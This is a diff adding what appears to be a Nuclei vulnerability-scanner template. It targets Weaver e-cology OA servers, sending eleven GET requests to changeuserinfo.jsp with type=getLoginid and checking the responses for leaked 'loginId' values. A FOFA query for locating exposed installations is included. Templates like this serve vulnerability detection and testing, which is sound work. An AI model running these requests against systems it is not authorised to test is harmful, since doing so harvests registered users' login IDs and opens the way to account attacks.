@@ -1,0 +1,51 @@
+id: ecology-ofslogin_vul
+time: "2023-05-17"
+
+info:
+  name: ecology-ofslogin_vul
+  author: ritikchaddha
+  severity: critical
+  description: 系统未对系统接口的响应进行合理的处理，导致该系统会泄漏已注册用户信息，攻击者可利用信息泄露漏洞获取注册用户的信息
+  reference: https://github.com/A0WaQ4/Weaver_ofslogin_vul
+  metadata:
+    max-request: 1
+    fofa-query: app="泛微-协同办公OA"
+
+http:
+  - method: 
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+      - GET
+    path:
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=0"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=1"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=2"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=3"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=4"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=5"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=6"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=7"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=8"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=9"
+      - "{{BaseURL}}//mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=10"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "loginId"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/09/28
